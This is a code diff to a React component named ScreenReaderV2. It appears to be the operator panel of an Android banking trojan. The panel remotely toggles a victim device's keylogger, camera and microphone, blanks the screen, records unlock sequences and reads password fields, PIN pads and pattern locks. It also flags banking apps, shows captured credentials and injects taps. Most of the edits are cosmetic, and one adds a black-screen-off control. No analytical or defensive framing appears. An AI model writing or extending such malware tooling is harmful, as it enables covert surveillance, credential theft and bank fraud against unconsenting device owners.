+                    onClick={() => { const c = bCenter(lySelected.bounds); if (c) sendCmd('LONG_PRESS', { x: c.x, y: c.y, duration: 800 }); }}>HOLD</button>
                 )}
                 {lySelected.scrollable && (
                   <>
@@ -1019,7 +1047,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </div>
           )}
 
-          {/* Inline PIN pad (when detected) */}
           {pinNodes.length > 0 && (
             <div className="card card-sm mb6" style={{ border: '1px solid rgba(96,165,250,.25)' }}>
               <div style={{ fontSize: 9, color: '#60a5fa', fontWeight: 700, letterSpacing: 1.5, marginBottom: 8 }}>PIN</div>
@@ -1035,12 +1062,9 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
         </div>
       )}
 
-      {/* ════════════════════════════════════════
-          V2 — SCREEN READER
-      ════════════════════════════════════════ */}
+      {/* ════ V2 ════ */}
       {mode === 'V2' && (
         <div>
-          {/* Status row */}
           <div style={{
             display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px',
             marginBottom: 10, borderRadius: 10, background: 'var(--card2)',
@@ -1058,11 +1082,9 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
               background: srOn ? 'rgba(74,222,128,.08)' : 'var(--bg3)',
               border: `1px solid ${srOn ? 'rgba(74,222,128,.28)' : 'var(--border)'}`,
             }}>
-              <div style={{
-                width: 6, height: 6, borderRadius: '50%',
+              <div style={{ width: 6, height: 6, borderRadius: '50%',
                 background: srOn ? '#4ade80' : 'var(--text3)',
-                boxShadow: srOn ? '0 0 5px #4ade80' : 'none',
-              }} />
+                boxShadow: srOn ? '0 0 5px #4ade80' : 'none' }} />
               <span style={{ fontSize: 10, fontWeight: 700, color: srOn ? '#4ade80' : 'var(--text3)' }}>
                 {srOn ? `ON · ${srHz}/s` : 'OFF'}
               </span>
@@ -1071,7 +1093,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
               onClick={() => { sendCmd('REQUEST_HIERARCHY'); toast2('REFRESH', '#fbbf24'); }}>↺</button>
           </div>
 
-          {/* Stats pills */}
           {nodes.length > 0 && (
             <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap', marginBottom: 10 }}>
               <Chip col="#d4950a">{nodes.length} nodes</Chip>
@@ -1083,7 +1104,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </div>
           )}
 
-          {/* Bank alert */}
           {bankApp && (
             <div style={{
               display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px',
@@ -1102,7 +1122,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </div>
           )}
 
-          {/* Password fields */}
           {pwdNodes.length > 0 && (
             <div style={{ marginBottom: 10 }}>
               {pwdNodes.map((n, i) => (
@@ -1122,7 +1141,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
                   </div>
                   {n.bounds && (
                     <span style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', flexShrink: 0 }}>
-                      {Math.round((n.bounds.left + n.bounds.right) / 2)},{Math.round((n.bounds.top + n.bounds.bottom) / 2)}
+                      {Math.round((n.bounds.left+n.bounds.right)/2)},{Math.round((n.bounds.top+n.bounds.bottom)/2)}
                     </span>
                   )}
                 </div>
@@ -1130,7 +1149,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </div>
           )}
 
-          {/* PIN pad */}
           {pinNodes.length > 0 && (
             <div style={{
               padding: '10px 12px', marginBottom: 10, borderRadius: 10,
@@ -1149,7 +1167,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </div>
           )}
 
-          {/* Pattern lock */}
           {patNode?.patternGrid && (
             <div style={{
               padding: '10px 12px', marginBottom: 10, borderRadius: 10,
@@ -1168,7 +1185,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </div>
           )}
 
-          {/* Swipe unlock */}
           {swipeNode?.swipeHint && (
             <div style={{
               padding: '10px 12px', marginBottom: 10, borderRadius: 10,
@@ -1183,7 +1199,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </div>
           )}
 
-          {/* V2 sub-tabs */}
           <div style={{ display: 'flex', gap: 3, marginBottom: 10 }}>
             {[['ocr','OCR'],['nodes','NODES'],['creds','CREDS'],['raw','RAW']].map(([id, label]) => (
               <button key={id} onClick={() => setV2tab(id)} style={{
@@ -1267,10 +1282,10 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
                   {rawData.length.toLocaleString()} chars · {srPkg || '—'}
                 </span>
                 <button onClick={() => navigator.clipboard?.writeText(rawData).catch(() => {})}
-                  style={{
-                    fontSize: 10, padding: '2px 8px', borderRadius: 5, cursor: 'pointer',
-                    border: '1px solid var(--gold-border)', background: 'var(--bg3)', color: 'var(--text2)',
-                  }}>COPY</button>
+                  style={{ fontSize: 10, padding: '2px 8px', borderRadius: 5, cursor: 'pointer',
+                    border: '1px solid var(--gold-border)', background: 'var(--bg3)', color: 'var(--text2)' }}>
+                  COPY
+                </button>
               </div>
               <div style={{
                 background: '#02030a', border: '1px solid rgba(255,255,255,.05)', borderRadius: 8,
@@ -1285,17 +1300,14 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
         </div>
       )}
 
-      {/* ════════════════════════════════════════
-          CONTROLS
-      ════════════════════════════════════════ */}
+      {/* ════ CONTROLS ════ */}
       {mode === 'CTRL' && (
         <div>
           <Sect label="LIVE" />
           <CtrlRow label="Device Info"  onClick={() => sendCmd('GET_DEVICE_INFO')} />
-          <CtrlRow label="Camera"       state={device.camera_active}      onClick={() => sendCmd('TOGGLE_CAMERA', { enabled: !device.camera_active })} />
-          <CtrlRow label="Microphone"   state={device.mic_active}         onClick={() => sendCmd('TOGGLE_MICROPHONE', { enabled: !device.mic_active })} />
-          <CtrlRow label="Keylogger"    state={device.keylogger_active}   onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: !device.keylogger_active })} />
-
+          <CtrlRow label="Camera"       state={device.camera_active}     onClick={() => sendCmd('TOGGLE_CAMERA', { enabled: !device.camera_active })} />
+          <CtrlRow label="Microphone"   state={device.mic_active}        onClick={() => sendCmd('TOGGLE_MICROPHONE', { enabled: !device.mic_active })} />
+          <CtrlRow label="Keylogger"    state={device.keylogger_active}  onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: !device.keylogger_active })} />
           <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 5, marginBottom: 5 }}>
             <button className="btn btn-green btn-sm btn-block"
               onClick={() => { toggleSR(true); setMode('V2'); }}>SR ON</button>
@@ -1317,11 +1329,11 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
           <CtrlRow label="Unlock Sequences" onClick={() => sendCmd('START_UNLOCK_RECORDING')} />
 
           <Sect label="SECURITY" />
-          <CtrlRow label="Admin Status"   onClick={() => sendCmd('CHECK_ADMIN_STATUS')} />
-          <CtrlRow label="Banks Crypter"  state={device.banks_crypter}
+          <CtrlRow label="Admin Status"  onClick={() => sendCmd('CHECK_ADMIN_STATUS')} />
+          <CtrlRow label="Banks Crypter" state={device.banks_crypter}
             onClick={() => sendCmd('TOGGLE_BOT_OPTION', { option: 'banks_crypter', enabled: !device.banks_crypter })} />
-          <CtrlRow label="Black Screen"   state={undefined}
-            onClick={() => sendCmd('BLACK_SCREEN_ON')} />
+          <CtrlRow label="Black Screen ON"  onClick={() => sendCmd('BLACK_SCREEN_ON')} />
+          <CtrlRow label="Black Screen OFF" onClick={() => sendCmd('BLACK_SCREEN_OFF')} />
 
           <Sect label="INJECT" />
           <div className="card card-sm mb8">
@@ -1409,9 +1421,7 @@ function NodeRow({ n, onTap, highlight }) {
         <div style={{ flex: 1, minWidth: 0 }}>
           {n.text && (
             <div style={{ fontWeight: 600, fontSize: 12, marginBottom: 2, wordBreak: 'break-word',
-              color: n.password ? '#f87171' : 'var(--text)' }}>
-              {n.text}
-            </div>
+              color: n.password ? '#f87171' : 'var(--text)' }}>{n.text}</div>
           )}
           <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)',
             overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
@@ -1453,8 +1463,7 @@ function Tag({ col, children }) {
 function Sect({ label }) {
   return (
     <div style={{
-      display: 'flex', alignItems: 'center', gap: 6,
-      marginTop: 16, marginBottom: 6,
+      display: 'flex', alignItems: 'center', gap: 6, marginTop: 16, marginBottom: 6,
       fontSize: 9, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2,
     }}>
       {label}
@@ -1468,8 +1477,7 @@ function CtrlRow({ label, state, onClick }) {
     <div onClick={onClick} style={{
       display: 'flex', alignItems: 'center', justifyContent: 'space-between',
       padding: '10px 14px', marginBottom: 4, borderRadius: 8, cursor: 'pointer',
-      background: 'rgba(255,255,255,.02)',
-      border: '1px solid rgba(255,255,255,.05)',
+      background: 'rgba(255,255,255,.02)', border: '1px solid rgba(255,255,255,.05)',
     }}>
       <span style={{ fontWeight: 600, fontSize: 12, color: 'var(--text)' }}>{label}</span>
       {state != null && (
